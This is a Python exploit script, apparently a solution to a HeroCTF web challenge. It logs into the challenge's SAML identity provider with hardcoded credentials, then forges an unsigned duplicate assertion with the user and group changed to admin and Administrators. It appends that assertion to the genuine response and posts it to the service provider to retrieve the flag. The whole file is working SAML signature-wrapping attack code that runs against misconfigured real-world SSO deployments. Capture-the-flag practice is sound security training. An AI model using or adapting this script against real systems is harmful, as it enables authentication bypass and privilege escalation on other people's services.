import requests
import re
import base64
import xml.etree.ElementTree as ET
import copy

SP_URL = "http://web.heroctf.fr:8080"
IDP_URL_SSO = "http://web.heroctf.fr:8081/sso"
USER = "user"
PASS = "oyJPNYd3HgeBkaE%!rP#dZvqf2z*4$^qcCW4V6WM"

def get_fresh_saml_response():
    sess = requests.Session()
    # 1. Start
    print("[*] Starting flow...")
    r1 = sess.get(f"{SP_URL}/flag")
    saml_req_match = re.search(r'name="SAMLRequest" value="([^"]+)"', r1.text)
    relay_state_match = re.search(r'name="RelayState" value="([^"]+)"', r1.text)
    if not saml_req_match:
        raise Exception("No SAMLRequest found")
    
    saml_request = saml_req_match.group(1)
    relay_state = relay_state_match.group(1) if relay_state_match else ""
    
    # 2. Login
    print("[*] Logging into IDP...")
    payload = {
        "user": USER,
        "password": PASS,
        "SAMLRequest": saml_request,
        "RelayState": relay_state
    }
    r2 = sess.post(IDP_URL_SSO, data=payload)
    
    saml_resp_match = re.search(r'name="SAMLResponse" value="([^"]+)"', r2.text)
    if not saml_resp_match:
        print(r2.text[:500])
        raise Exception("No SAMLResponse found")
        
    return saml_resp_match.group(1), relay_state, sess

saml_b64, relay_state, sess = get_fresh_saml_response()
saml_xml = base64.b64decode(saml_b64).decode('utf-8')

print("[+] Got fresh SAMLResponse")

# Parse
ET.register_namespace('saml', 'urn:oasis:names:tc:SAML:2.0:assertion')
ET.register_namespace('samlp', 'urn:oasis:names:tc:SAML:2.0:protocol')
ET.register_namespace('ds', 'http://www.w3.org/2000/09/xmldsig#')
ET.register_namespace('xs', 'http://www.w3.org/2001/XMLSchema')

try:
    root = ET.fromstring(saml_xml)
except ET.ParseError:
    print("Parse Error")
    exit(1)

ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion', 'ds': 'http://www.w3.org/2000/09/xmldsig#'}

# Find valid assertion
valid_assertion = root.find('.//saml:Assertion', ns)
if valid_assertion is None:
    print("No assertion found")
    exit(1)

# Clone
malicious_assertion = copy.deepcopy(valid_assertion)

# Modify Malicious Assertion
# 1. Remove Signature
sig = malicious_assertion.find('ds:Signature', ns)
if sig is not None:
    malicious_assertion.remove(sig)
    print("[+] Removed signature from malicious assertion")

# 2. Change ID
malicious_assertion.set('ID', 'malicious_admin_assertion')

# 3. Change Attributes
found_user = False
found_group = False

for attribute in malicious_assertion.findall('.//saml:Attribute', ns):
    attr_val = attribute.find('saml:AttributeValue', ns)
    if attr_val is not None:
        if attr_val.text == 'user':
            attr_val.text = 'admin'
            found_user = True
            print("[+] Changed user to admin")
        elif attr_val.text == 'Users':
            attr_val.text = 'Administrators'
            found_group = True
            print("[+] Changed Users to Administrators")

if not found_user:
    print("[-] Could not find user attribute")
if not found_group:
    print("[-] Could not find group attribute")

# 4. Append
root.append(malicious_assertion)
print("[+] Appended malicious assertion")

# Serialize
modified_xml = ET.tostring(root, encoding='utf-8')

# Encode
modified_b64 = base64.b64encode(modified_xml).decode('utf-8')

# Send to SP
print("[*] Sending exploit to SP...")
acs_url = root.get('Destination')
if not acs_url:
    acs_url = f"{SP_URL}/saml/acs" 

print(f"[*] Posting to {acs_url}")

payload = {
    "SAMLResponse": modified_b64,
    "RelayState": relay_state
}

r3 = sess.post(acs_url, data=payload)

print("[-] Final Response Code:", r3.status_code)
print("[-] Final Response Body:")
print(r3.text)

if "Hero{" in r3.text:
    print("\n[!!!] FLAG FOUND [!!!]")
    flag = re.search(r'Hero\{[^}]+\}', r3.text)
    if flag:
        print(flag.group(0))
